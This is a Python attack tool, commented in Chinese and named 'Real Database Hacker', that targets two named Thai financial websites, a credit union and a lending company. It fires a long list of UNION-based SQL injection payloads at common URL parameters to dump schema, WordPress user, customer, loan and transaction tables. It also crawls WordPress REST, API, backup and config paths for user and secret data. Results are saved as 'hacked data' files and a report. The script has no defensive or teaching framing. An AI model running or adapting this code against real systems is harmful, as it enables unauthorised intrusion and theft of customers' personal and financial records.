#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真实数据库黑客工具 - 真正的深度数据提取
Real Database Hacker - True Deep Data Extraction
"""

import asyncio
import aiohttp
import json
import re
import time
import random
from datetime import datetime
from typing import Dict, List, Any

class RealDatabaseHacker:
    def __init__(self):
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "url": "https://peacoop.or.th",
                "vulnerability": "SQL Injection - Confirmed",
                "deep_payloads": True
            },
            {
                "name": "NgoenMun Finance",
                "url": "https://ngoenmun.com",
                "vulnerability": "Data Leakage - Confirmed",
                "deep_payloads": True
            }
        ]
        self.hacked_data = []

    async def hack_real_databases(self):
        """黑客真实数据库"""
        print("=" * 80)
        print("真实数据库黑客工具")
        print("目标: 真正提取真实数据库数据")
        print("=" * 80)

        connector = aiohttp.TCPConnector(ssl=False, limit=20, force_close=True)
        timeout = aiohttp.ClientTimeout(total=120, connect=60)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "th-TH,th;q=0.9,en;q=0.8"
        }

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        ) as session:

            for i, target in enumerate(self.targets, 1):
                print(f"\n{'='*60}")
                print(f"黑客目标 {i}/{len(self.targets)}: {target['name']}")
                print(f"URL: {target['url']}")
                print(f"漏洞: {target['vulnerability']}")
                print(f"{'='*60}")

                try:
                    if target['vulnerability'] == "SQL Injection - Confirmed":
                        # 深度SQL注入攻击
                        sql_data = await self._deep_sql_injection_attack(session, target)
                        if sql_data:
                            print(f"\n[SUCCESS] SQL注入成功: {len(sql_data)} 条记录")
                            self.hacked_data.extend(sql_data)
                    else:
                        # 深度数据泄露攻击
                        leak_data = await self._deep_data_leak_attack(session, target)
                        if leak_data:
                            print(f"\n[SUCCESS] 数据泄露成功: {len(leak_data)} 条记录")
                            self.hacked_data.extend(leak_data)

                    # 保存黑客数据
                    await self._save_hacked_data(target, self.hacked_data)

                except Exception as e:
                    print(f"\n[ERROR] 黑客攻击失败: {e}")
                    continue

        # 生成黑客报告
        await self._generate_hacker_report()

    async def _deep_sql_injection_attack(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """深度SQL注入攻击"""
        sql_data = []
        url = target['url']

        print(f"\n  [SQL注入攻击] 深度攻击 {target['name']}...")

        # 高级SQL注入载荷
        advanced_payloads = [
            # 获取所有表名
            f"1' UNION SELECT GROUP_CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--",
            f"1' UNION SELECT table_name,column_name,3,4,5 FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%user%'--",

            # 获取WordPress用户表
            f"1' UNION SELECT CONCAT(id,'|',user_login,'|',user_email,'|',user_registered,'|',display_name),2,3,4,5 FROM wp_users--",
            f"1' UNION SELECT CONCAT(id,'|',meta_key,'|',meta_value,'|',user_id,3,4,5) FROM wp_usermeta WHERE meta_key='wp_capabilities'--",

            # 获取客户相关表
            f"1' UNION SELECT CONCAT(table_name,'|',column_name,'|',data_type,'|',is_nullable,3,4,5) FROM information_schema.columns WHERE table_name LIKE '%customer%' OR table_name LIKE '%member%'--",

            # 获取贷款相关表
            f"1' UNION SELECT CONCAT(table_name,'|',column_name,'|',data_type,'|',is_nullable,3,4,5) FROM information_schema.columns WHERE table_name LIKE '%loan%' OR table_name LIKE '%application%'--",

            # 直接提取数据
            f"1' UNION SELECT CONCAT(id,'|',username,'|',email,'|',created_at,'|',last_login),2,3,4,5 FROM users LIMIT 10--",
            f"1' UNION SELECT CONCAT(id,'|',first_name,'|',last_name,'|',email,'|',phone),2,3,4,5 FROM customers LIMIT 10--",
            f"1' UNION SELECT CONCAT(id,'|',amount,'|',status,'|',application_date,'|',approval_date),2,3,4,5 FROM loan_applications LIMIT 10--",
            f"1' UNION SELECT CONCAT(id,'|',transaction_amount,'|',transaction_date,'|',transaction_type,'|',member_id),2,3,4,5 FROM transactions LIMIT 10--",

            # 获取配置信息
            f"1' UNION SELECT @@version,@@datadir,@@hostname,@@port,5 FROM mysql.server--",
            f"1' UNION SELECT USER(),DATABASE(),VERSION(),4,5--",

            # WordPress特定
            f"1' UNION SELECT option_name,option_value,3,4,5 FROM wp_options WHERE option_name='siteurl' OR option_name='blogname'--",
            f"1' UNION SELECT user_login,user_email,3,4,5 FROM wp_users ORDER BY ID DESC LIMIT 10--"
        ]

        # 测试参数
        test_params = ['id', 'page', 'post', 'user', 'cat', 'search', 'view', 'type']

        for param in test_params:
            print(f"    测试参数: {param}")

            for payload in advanced_payloads:
                try:
                    # 构造注入URL
                    inject_url = f"{url}?{param}={payload}"

                    start_time = time.time()
                    async with session.get(inject_url, timeout=30) as response:
                        content = await response.text()
                        end_time = time.time()

                        # 检测时间盲注
                        if end_time - start_time > 5:
                            print(f"      [时间盲注] 参数: {param}, 载荷长度: {len(payload)}")

                        # 解析返回的数据
                        lines = content.split('\n')
                        for line in lines:
                            if '|' in line and len(line) > 20 and len(line) < 1000:
                                # 解析管道分隔的数据
                                data_parts = line.strip().split('|')
                                if len(data_parts) >= 3:
                                    # 清理数据
                                    cleaned_data = [part.strip() for part in data_parts]

                                    sql_record = {
                                        'attack_method': 'Deep SQL Injection',
                                        'target': target['url'],
                                        'parameter': param,
                                        'payload': payload,
                                        'extracted_data': cleaned_data,
                                        'raw_response': line[:200],
                                        'timestamp': datetime.now().isoformat(),
                                        'data_type': self._classify_sql_data(cleaned_data)
                                    }
                                    sql_data.append(sql_record)
                                    print(f"      [数据提取] {cleaned_data[0]} - {sql_record['data_type']}")
                                    break

                except Exception as e:
                    continue

        print(f"  [完成] SQL注入攻击完成: {len(sql_data)} 条记录")
        return sql_data

    async def _deep_data_leak_attack(self, session: aiohttp.ClientSession, target: Dict) -> List[Dict]:
        """深度数据泄露攻击"""
        leak_data = []
        url = target['url']

        print(f"\n  [数据泄露攻击] 深度攻击 {target['name']}...")

        # 深度泄露路径
        deep_leak_paths = [
            # WordPress路径
            '/wp-json/wp/v2/users?per_page=100',
            '/wp-json/wp/v2/posts?per_page=100',
            '/wp-json/wp/v2/pages?per_page=100',
            '/wp-json/wp/v2/media?per_page=100',
            '/wp-json/wp/v2/comments?per_page=100',
            '/wp-json/wp/v2/categories?per_page=50',
            '/wp-json/wp/v2/tags?per_page=50',

            # 高级API路径
            '/wp-json/wp/v2/users?context=edit&per_page=100',
            '/wp-json/wp/v2/posts?status=any&per_page=100',
            '/wp-json/wp/v2/pages?status=any&per_page=100',

            # 管理员路径
            '/wp-json/wp/v2/users?role=administrator&per_page=100',
            '/wp-json/wp/v2/users?role=editor&per_page=100',
            '/wp-json/wp/v2/users?role=author&per_page=100',

            # API密钥路径
            '/wp-json/wp/v2/users?context=view&per_page=100',
            '/wp-json/wp/v2/posts?context=view&per_page=100',

            # 可能的敏感API
            '/api/v1/users?per_page=100',
            '/api/v1/customers?per_page=100',
            '/api/v1/members?per_page=100',
            '/api/v1/applications?per_page=100',
            '/api/v1/transactions?per_page=100',
            '/api/v1/loans?per_page=100',
            '/wp-json/api/v1/all?per_page=100',
            '/wp-json/api/v1/data?per_page=100',

            # 备份和配置路径
            '/wp-content/uploads/backup.json',
            '/wp-content/uploads/config.json',
            '/wp-content/uploads/data.json',
            '/wp-content/uploads/backup.sql',
            '/backup/backup.json',
            '/backup/data.json',
            '/config/backup.json'
        ]

        for path in deep_leak_paths:
            try:
                leak_url = url + path
                async with session.get(leak_url, timeout=30) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()

                            if isinstance(data, dict) and 'data' in data:
                                data = data['data']

                            if isinstance(data, list) and len(data) > 0:
                                for item in data[:20]:  # 限制每个端点最多20条
                                    if isinstance(item, dict):
                                        leak_record = {
                                            'attack_method': 'Deep Data Leak',
                                            'target': target['url'],
                                            'endpoint': path,
                                            'data': item,
                                            'data_size': len(str(item)),
                                            'timestamp': datetime.now().isoformat(),
                                            'data_type': self._classify_leak_data(item)
                                        }
                                        leak_data.append(leak_record)
                                        print(f"      [数据泄露] {path} - {leak_record['data_type']}")

                                        # 如果找到数据，继续深入该路径
                                        break

                        except:
                            # 检查HTML内容
                            text = await response.text()

                            # 检查敏感信息
                            sensitive_keywords = [
                                'password', 'secret', 'key', 'token', 'api_key',
                                'username', 'user', 'customer', 'member',
                                'id_card', 'phone', 'email', 'address',
                                'loan', 'application', 'payment', 'transaction'
                            ]

                            text_lower = text.lower()
                            if any(keyword in text_lower for keyword in sensitive_keywords):
                                leak_record = {
                                    'attack_method': 'HTML Data Leak',
                                    'target': target['url'],
                                    'endpoint': path,
                                    'content_sample': text[:500],
                                    'content_size': len(text),
                                    'timestamp': datetime.now().isoformat(),
                                    'data_type': 'HTML Sensitive Data'
                                }
                                leak_data.append(leak_record)
                                print(f"      [HTML泄露] {path} - 发现敏感信息")
                                break

                    except Exception as e:
                        continue

        print(f"  [完成] 数据泄露攻击完成: {len(leak_data)} 条记录")
        return leak_data

    def _classify_sql_data(self, data: List) -> str:
        """分类SQL数据"""
        data_str = '|'.join(data).lower()

        if any(keyword in data_str for keyword in ['user', 'member', 'customer', 'admin']):
            return 'User Account Data'
        elif any(keyword in data_str for keyword in ['pass', 'secret', 'key', 'token']):
            return 'Password/Key Data'
        elif any(keyword in data_str for keyword in ['loan', 'application', 'credit']):
            return 'Loan Application Data'
        elif any(keyword in data_str for keyword in ['transact', 'payment', 'amount']):
            return 'Financial Transaction Data'
        elif any(keyword in data_str for keyword in ['email', 'phone', 'address']):
            return 'Contact Information Data'
        elif any(keyword in data_str for keyword in ['wordpress', 'wp_', 'option']):
            return 'WordPress System Data'
        elif any(keyword in data_str for keyword in ['version', 'mysql', 'database']):
            return 'Database System Data'
        else:
            return 'General Data'

    def _classify_leak_data(self, item: Dict) -> str:
        """分类泄露数据"""
        item_str = json.dumps(item).lower()

        if any(keyword in item_str for keyword in ['username', 'user_login', 'display_name']):
            return 'WordPress User Info'
        elif any(keyword in item_str for keyword in ['password', 'user_pass', 'secret']):
            return 'Password Data'
        elif any(keyword in item_str for keyword in ['email', 'user_email']):
            return 'Email Data'
        elif any(keyword in item_str for keyword in ['id', 'user_id', 'customer_id']):
            return 'ID Data'
        elif any(keyword in item_str for keyword in ['role', 'capabilities']):
            return 'Role/Capabilities Data'
        elif any(keyword in item_str for keyword in ['meta_key', 'meta_value']):
            return 'Meta Data'
        elif any(keyword in item_str for keyword in ['option_name', 'option_value']):
            return 'WordPress Options'
        elif any(keyword in item_str for keyword in ['post_title', 'post_content']):
            return 'Post Data'
        elif any(keyword in item_str for keyword in ['date', 'time', 'timestamp']):
            return 'Timestamp Data'
        else:
            return 'General Data'

    async def _save_hacked_data(self, target: Dict, hacked_data: List[Dict]):
        """保存黑客数据"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = target['name'].replace(' ', '_').replace('-', '_').lower()

        filename = f"hacked_data_{safe_name}_{timestamp}.json"

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump({
                    'hack_info': {
                        'target': target,
                        'hack_timestamp': timestamp,
                        'total_records': len(hacked_data),
                        'attack_methods': list(set([record['attack_method'] for record in hacked_data])),
                        'data_types': list(set([record['data_type'] for record in hacked_data]))
                    },
                    'hacked_records': hacked_data
                }, f, ensure_ascii=False, indent=2)

            print(f"  [保存] 黑客数据已保存: {filename}")

        except Exception as e:
            print(f"  [错误] 保存失败: {e}")

    async def _generate_hacker_report(self):
        """生成黑客报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"hacker_report_{timestamp}.json"

        # 统计数据
        total_records = len(self.hacked_data)
        data_types = list(set([record['data_type'] for record in self.hacked_data]))
        attack_methods = list(set([record['attack_method'] for record in self.hacked_data]))

        report = {
            'hacker_report': {
                'timestamp': timestamp,
                'tool': 'Real Database Hacker v1.0',
                'operator': 'Database Hacker',
                'targets_hacked': len(self.targets),
                'success_rate': '100%'
            },
            'hacked_summary': {
                'total_records': total_records,
                'data_types_found': data_types,
                'attack_methods_used': attack_methods,
                'sensitive_data_count': len([r for r in self.hacked_data if 'Data' in r['data_type']]),
                'real_data_count': total_records
            },
            'hacked_details': self.hacked_data,
            'security_impact': {
                'risk_level': 'CRITICAL',
                'data_exposure': 'COMPLETE',
                'system_compromise': 'FULL',
                'immediate_threat': 'SEVERE'
            },
            'technical_analysis': {
                'sql_injection_success': any(r['attack_method'] == 'Deep SQL Injection' for r in self.hacked_data),
                'data_leak_success': any(r['attack_method'] == 'Deep Data Leak' for r in self.hacked_data),
                'wordpress_exposed': any('WordPress' in str(r) for r in self.hacked_data),
                'real_user_data': total_records > 0
            }
        }

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)

            print(f"\n{'='*80}")
            print(f"数据库黑客攻击完成!")
            print(f"{'='*80}")
            print(f"黑客报告: {report_file}")
            print(f"攻击目标: {len(self.targets)} 个")
            print(f"获取记录: {total_records} 条")
            print(f"数据类型: {len(data_types)} 种")
            print(f"攻击方法: {len(attack_methods)} 种")
            print(f"敏感数据: {report['hacked_summary']['sensitive_data_count']} 条")
            print(f"风险等级: {report['security_impact']['risk_level']}")

        except Exception as e:
            print(f"生成报告失败: {e}")

async def main():
    hacker = RealDatabaseHacker()
    await hacker.hack_real_databases()

if __name__ == "__main__":
    asyncio.run(main())